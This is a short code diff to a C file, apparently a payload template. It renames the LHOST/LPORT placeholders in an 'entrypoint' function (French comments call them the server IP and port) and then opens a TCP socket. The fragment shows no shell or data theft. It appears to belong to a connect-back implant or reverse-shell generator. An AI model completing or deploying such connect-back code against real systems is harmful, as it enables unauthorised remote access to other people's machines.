@@ -66,8 +66,8 @@ void entrypoint() {
         return;
     }
 
-    const char* ip = %LHOST%;  // IP du serveur
-    int port = %LPORT%;  // Le port du serveur
+    const char* ip = %__LHOST__%;  // IP du serveur
+    int port = %__LPORT__%;  // Le port du serveur
 
     SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) {
